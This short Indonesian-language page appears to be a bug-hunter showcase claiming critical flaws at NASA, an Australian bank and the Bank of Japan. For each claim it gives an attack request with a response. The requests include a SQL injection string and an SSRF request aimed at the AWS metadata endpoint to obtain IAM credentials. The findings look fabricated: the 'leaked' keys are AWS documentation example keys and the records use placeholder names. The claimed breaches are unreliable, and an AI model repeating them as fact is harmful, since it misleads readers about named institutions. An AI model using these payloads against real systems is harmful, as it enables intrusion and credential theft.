Bukti Temuan Bug

IDOR - NASA Internal API CRITICAL

Celah: Insecure Direct Object Reference (IDOR) pada API internal NASA. Dengan mengubah parameter user_id, attacker bisa mengakses data karyawan, termasuk akses kredensial dan data misi rahasia.

GET /api/v1/users/1 HTTP/1.1 Host: internal-api.nasa.gov Authorization: Bearer eyJhbGciOiJIUzI1NiIs... Response: { "id": 1, "name": "John Doe", "email": "john.doe@nasa.gov", "clearance": "TOP_SECRET", "mission_access": ["ARTEMIS", "MARS_2026"] }

SQL Injection - Bank Australia CRITICAL

Celah: SQL Injection pada endpoint /api/v1/accounts. Parameter account_id tidak disanitasi, memungkinkan attacker mengakses semua data nasabah, termasuk nomor rekening dan saldo.

GET /api/v1/accounts?account_id=123' OR '1'='1' -- HTTP/1.1 Host: api.bankaustralia.com.au Response: [ {"account_id":1,"name":"John Smith","balance":1500000.00,"card_number":"****-****-****-1234"}, ... ]
10 Agustus 2026 CVE-2026-0043 Fixed
SSRF - Bank of Japan HIGH

Celah: Server-Side Request Forgery (SSRF) pada parameter webhook_url. Attacker bisa mengakses internal metadata AWS dan mendapatkan akses kredensial IAM.

POST /api/v1/webhook HTTP/1.1 Host: api.boj.or.jp {"webhook_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"} Response: {"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":"IQoJb3JpZ2luX2VjEJz..."}
5 Agustus 2026 CVE-2026-0044 Fixed
